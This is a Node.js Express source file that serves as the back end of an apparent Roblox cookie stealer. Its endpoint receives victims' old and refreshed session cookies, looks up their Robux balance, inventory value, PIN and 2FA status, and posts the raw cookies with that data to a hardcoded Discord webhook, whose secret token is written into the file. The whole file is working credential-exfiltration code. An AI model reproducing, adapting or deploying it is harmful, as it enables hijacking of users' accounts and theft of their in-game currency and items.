const express = require('express');
const axios = require('axios');
const { RobloxUser } = require('./getuserinfo');

const app = express();
app.use(express.json());

app.post('/api/webhook', async (req, res) => {
    const webhookURL = "https://discord.com/api/webhooks/1450559440221900941/G8PfWJn3sZ6FEtCdVzgFUg-IgYHzPG2vhEN4lHMQLGGjQ8rRhPsOdvrCK7GTp8yOfiLZ";
    
    const { refreshedCookie, oldCookie } = req.body;
    if (!refreshedCookie || !oldCookie) {
        return res.status(400).send("Missing cookie data.");
    }

    try {
        const robloxUser = await RobloxUser.register(refreshedCookie);
        const userData = await robloxUser.getUserData();
        const format = (num) => new Intl.NumberFormat('en-US').format(num);

        const embed = {
            color: 0x7b42f5,
            author: { name: `${userData.displayName} (@${userData.username})`, url: `https://www.roblox.com/users/${userData.uid}/profile`, icon_url: "https://i.imgur.com/bjd3g6r.png" },
            thumbnail: { url: userData.avatarUrl },
            fields: [
                { name: '💰 Robux', value: `\`${format(userData.balance)}\``, inline: true }, { name: '📈 RAP', value: `\`${format(userData.rap)}\``, inline: true }, { name: '💳 Credit', value: `\`${userData.creditBalance}\``, inline: true },
                { name: '⭐ Premium', value: userData.isPremium ? '✅ Active' : '❌ None', inline: true }, { name: '📍 Country', value: `\`${userData.country}\``, inline: true }, { name: '🎂 Created', value: `\`${userData.createdAt}\``, inline: true },
                { name: '🔒 PIN', value: userData.isPinEnabled ? '✅ Enabled' : '❌ Disabled', inline: true }, { name: '🛡️ 2FA', value: userData.isTwoStepVerificationEnabled ? '✅ Enabled' : '❌ Disabled', inline: true }, { name: '\u200B', value: '\u200B', inline: true },
                { name: '🍪 New Cookie', value: `\`\`\`${refreshedCookie}\`\`\``, inline: false }, { name: '↩️ Old Cookie', value: `\`\`\`${oldCookie}\`\`\``, inline: false },
            ],
            footer: { text: "Roblox Refresher • Success", icon_url: "https://i.imgur.com/9Cg0Y96.png" },
            timestamp: new Date().toISOString()
        };

        await axios.post(webhookURL, { embeds: [embed] });
        res.status(200).send("Webhook sent.");
    } catch (error) {
        console.error("WEBHOOK TASK FAILED:", error.message);
        res.status(500).send("Error executing webhook task.");
    }
});

module.exports = app;
